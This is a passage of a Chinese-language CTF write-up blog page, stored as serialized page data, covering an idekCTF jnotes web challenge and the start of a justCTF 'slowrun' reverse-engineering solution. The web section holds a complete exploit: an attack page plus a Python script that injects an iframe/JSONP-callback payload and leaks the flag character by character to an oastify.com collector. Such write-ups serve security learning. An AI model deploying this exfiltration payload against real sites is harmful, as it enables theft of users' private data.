class=\"x-inline-highlight\">a</code>标签添加<code class=\"x-inline-highlight\">target=\"_blank\"</code>或<code class=\"x-inline-highlight\">target=\"_top\"</code>属性就可以了。顺着这个思路，看到一个有意思的民间解法，同样是构造一个攻击页面："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<script>\n    window.open(\"{{target}}/note/{{note_id}}\");\n    location.href = \"{{target}}/api/flag\";\n</script>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{{target}}/note/{{note_id}}\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token string\">\"{{target}}/api/flag\"</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"在访问这个页面时，会打开一个新窗口加载笔记，然后当前窗口跳转到<code class=\"x-inline-highlight\">/api/flag</code>；"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"在笔记页面，创建多个<code class=\"x-inline-highlight\">a</code>标签："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"i = 9\n# {\"flag\":\"idek{...}\"}\n#          ^\n#         i=9\n\nanchors = \"\\n\".join([\n    f'<a id=\"{ch}\" href=\"//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_{i - 9}={ch}\" target=\"_blank\">{ch}</a>'\n    for ch in \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}\"\n])\npayload = f\"\"\"\n    <iframe srcdoc='\n        {anchors}\n        <script src=\"/api/view/anything?callback=window[top.opener.document.body.innerText[{i}]].click\"></script>\n    '></iframe>\n\"\"\"\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$20"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"为<code class=\"x-inline-highlight\">a</code>标签设置了<code class=\"x-inline-highlight\">id=xxx</code>后，可以通过window.xxx访问到这个元素；（对任意标签都适用）"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"注意这些<code class=\"x-inline-highlight\">a</code>标签是在<code class=\"x-inline-highlight\">iframe</code>中定义并被点击的，而这里的<code class=\"x-inline-highlight\">iframe</code>作为笔记内容被加载；此时JSONP回调中："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">top</code>取得的是笔记页面的<code class=\"x-inline-highlight\">window</code>对象；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">top.opener</code>取得的是攻击页面的<code class=\"x-inline-highlight\">window</code>对象；（因为是通过攻击页面<code class=\"x-inline-highlight\">window.open</code>打开的笔记页面）"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"攻击页面在打开笔记页面后，立刻跳转到了<code class=\"x-inline-highlight\">/api/flag</code>，此时<code class=\"x-inline-highlight\">top.opener.document.body.innerText</code>就是flag的内容了！因此这里<code class=\"x-inline-highlight\">top.opener.document.body.innerText[...]</code>刚好取到了<code class=\"x-inline-highlight\">/api/flag</code>的响应的第<code class=\"x-inline-highlight\">i</code>个字符；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">window[...]</code>又拿到了对应的<code class=\"x-inline-highlight\">a</code>标签，最后通过<code class=\"x-inline-highlight\">click</code>带外。"}}]}]]}]]}]]}],["$","h4",null,{"className":"x-h3","children":"完整代码"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"最终的攻击页面代码如下："}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">index.html</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>Exploit</title>\n</head>\n<body>\n<script>\n    window.open(\"{{target}}/note/{{note_id}}\");\n    location.href = \"{{target}}/api/flag\";\n</script>\n</body>\n</html>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$21"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">exp.py</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"from flask import Flask, render_template\nimport requests\n\ntarget = \"https://jnotes-web.chal.idek.team\"\n\ni = 9\n# {\"flag\":\"idek{...}\"}\n#          ^\n#         i=9\n\nanchors = \"\n\n    f'<a id=\"{ch}\" href=\"//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_{i - 9}={ch}\" target=\"_blank\">{ch}</a>'\n    for ch in \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}\"\n])\npayload = f\"\"\"\n    <iframe srcdoc='\n        {anchors}\n        <script src=\"/api/view/anything?callback=window[top.opener.document.body.innerText[{i}]].click\"></script>\n    '></iframe>\n\"\"\"\n\nresp = requests.post(target + \"/api/post\", json={\"noteContent\": payload, \"noteTitle\": \"anything\"})\nnote_id = resp.json()[\"id\"]\nprint(note_id)\n\napp = Flask(__name__, template_folder=\".\")\n\n\n@app.route(\"/\")\ndef index():\n    return render_template(\"index.html\", target=target, note_id=note_id)\n\n\napp.run(\"0.0.0.0\", 5003)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$22"}}]}]]}],["$","$L1a",null,{"src":"3.jpg","filterDarkTheme":true}],["$","$L1a",null,{"src":"4.jpg","filterDarkTheme":true}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这样就可以逐位带外flag了。（也可以考虑更自动化的实现）"}}],["$","h2",null,{"className":"x-h1","children":"justCTF/rev/slowrun"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"分析整个程序能看出这是一个大整数运算的实现，生成flag时有两个函数递归进行调用："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"F(x): x - 4 + (73 * x**5) + (8 * x**3) + G(x-1), F(0) = 2, else F(x) = 1 for x <= 1\nG(x): F(x-1) + 3F(x-2) - 5F(x-3) + (3 * x**4), G(x) = 1 for x <= 1\nflag = F(13337) % A + B\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"F(x): x - 4 + (73 * x**5) + (8 * x**3) + G(x-1), F(0) = 2, else F(x) = 1 for x &lt;= 1\nG(x): F(x-1) + 3F(x-2) - 5F(x-3) + (3 * x**4), G(x) = 1 for x &lt;= 1\nflag = F(13337) % A + B\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"A和B是两个大整数常数，可以直接在程序中找到。<code class=\"x-inline-highlight\">F</code>和<code class=\"x-inline-highlight\">G</code>函数的递归调用会导致计算量非常大，直接运行会超时，用动态规划重写一下："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$23"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$24"}}]}]]}]]
+d:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"idekCTF 2025 & justCTF 2025 Writeup - 铃木的网络日记"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/25c/wp-idekctf-justctf-2025/"}]]
+1:null
